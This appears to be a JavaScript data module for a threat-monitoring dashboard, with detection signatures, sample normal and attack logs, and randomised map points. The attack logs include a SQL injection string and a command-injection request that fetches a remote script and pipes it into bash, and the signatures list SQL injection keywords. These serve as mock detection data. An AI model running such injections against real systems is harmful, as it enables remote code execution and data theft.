export const DEFAULT_SIGNATURES = [
  { id: 1, category: "SQL Injection", severity: "critical", mitre: "T1190", pattern: "UNION SELECT, OR 1=1, DROP TABLE", example: "GET /api?id=1' UNION SELECT", active: true },
  { id: 2, category: "DDoS / Flood", severity: "critical", mitre: "T1498", pattern: "requests/sec > 5000", example: "12.34.56.78 req/s > 8000", active: true }
];

export const NORMAL_LOGS = [
  "GET /api/users/profile HTTP/1.1 — 200 OK", 
  "POST /api/auth/login HTTP/1.1 — 200 OK — user: alice", 
  "GET /dashboard HTTP/1.1 — session valid"
];

export const ATTACK_LOGS = [
  "GET /api?id=1' UNION SELECT username FROM users", 
  "SSH login failed: attempt 47/100", 
  "POST /api/exec?cmd=;curl+http://185.234/x.sh|bash"
];

export const SEV_COLOR = { 
  critical: "#ef4444", 
  high: "#f97316", 
  medium: "#f59e0b", 
  low: "#22c55e", 
  normal: "#3b82f6" 
};

export const LAYERS_DB = {
  ddos: Array.from({length: 40}).map(() => ({ lat: (Math.random()-0.5)*160, lng: (Math.random()-0.5)*360, type: "DDoS Botnet", color: "#f97316", rad: 0.6 })),
  malware: Array.from({length: 25}).map(() => ({ lat: (Math.random()-0.5)*160, lng: (Math.random()-0.5)*360, type: "Malware Ops", color: "#ef4444", rad: 0.8 })),
  centers: Array.from({length: 15}).map(() => ({ lat: (Math.random()-0.5)*160, lng: (Math.random()-0.5)*360, type: "Data Center Phase", color: "#3b82f6", rad: 0.4 })),
  outages: Array.from({length: 5}).map(() => ({ lat: (Math.random()-0.5)*160, lng: (Math.random()-0.5)*360, type: "Kinetic Outage", color: "#a855f7", rad: 1.0 }))
};

export const MOCK_COORD = Object.values(LAYERS_DB).flat();
